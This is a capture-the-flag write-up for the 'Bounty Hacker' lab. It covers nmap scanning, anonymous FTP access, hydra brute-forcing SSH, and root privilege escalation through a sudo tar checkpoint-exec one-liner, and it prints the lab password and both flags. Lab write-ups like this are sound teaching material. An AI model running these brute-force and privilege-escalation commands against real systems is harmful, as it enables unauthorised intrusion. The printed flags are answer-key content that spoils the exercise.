Bounty Hacker

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!
You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

Machine IP address: 
```
10.10.48.74
```
We start our investigation by performing a nmap scan:
```
nmap -A -T4 10.10.48.74
```
in the results we can see that there are multiple ports open, related to different services including:
```
- 21 - ftp
- 22 - ssh
- 80 - http
```
We go and check what is available at the http port via our browser by navigating to:
```
10.10.48.74
```
We reach some generic web page, with some text. Some named are mentioned, maybe potential users:
```
Spike
Jet
Ed
Edward
Ein
Faye
```
page source doesn't contain anything special.
robots.txt file doesn't exist.
dirbuster to find some paths and directories didn't return anything useful.
enumeration over possible usernames using enum4linux also didn't work.

The webpage mentions we should have access to the target from our computer. SSH  with the names we found doesn't work, let's try FTP into the target:
```
ftp 10.10.48.74
(Name: ) anonymous
```
And it worked!
We execute 'ls' in the ftp command line, and see one of the results is:
```
task.txt
```
We can try and read it using:
```
get task.txt -
```
![[Pasted image 20250216135529.png]]
and we can see the author (and possibly another user):
```
lin
```
We transfer both results 'task.txt' and 'locks.txt', and exit the FTP connection.
We read 'locks.txt' and it seems to contain passphrases.

Now we can try these passwords and 'lin' as a username to SSH to the target:
```
hydra -l lin -P locks.txt ssh://10.10.48.74
```
and we get lin's password: RedDr4gonSynd1cat3. Now we SSH:
```
ssh lin@10.10.48.74
password: RedDr4gonSynd1cat3
```
And we're in!
Inside lin's desktop we find the 'user.txt' flag:
```
THM{CR1M3_SyNd1C4T3}
```
We can try find ways to perform privilege escalation. We can check if 'lin' has any root privileges:
```
sudo -l
```
and we see that 'lin' can execute the following command:
```
(root) /bin/tar
```
We search for possible commands, and see "https://gtfobins.github.io/" that we have: 
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
We get a shell open up and with a simple 'whoami' we can see we are the root. Finally, we do:
```
cd /root/
ls
cat root.txt
```
to get:
```
THM{80UN7Y_h4cK3r}
```
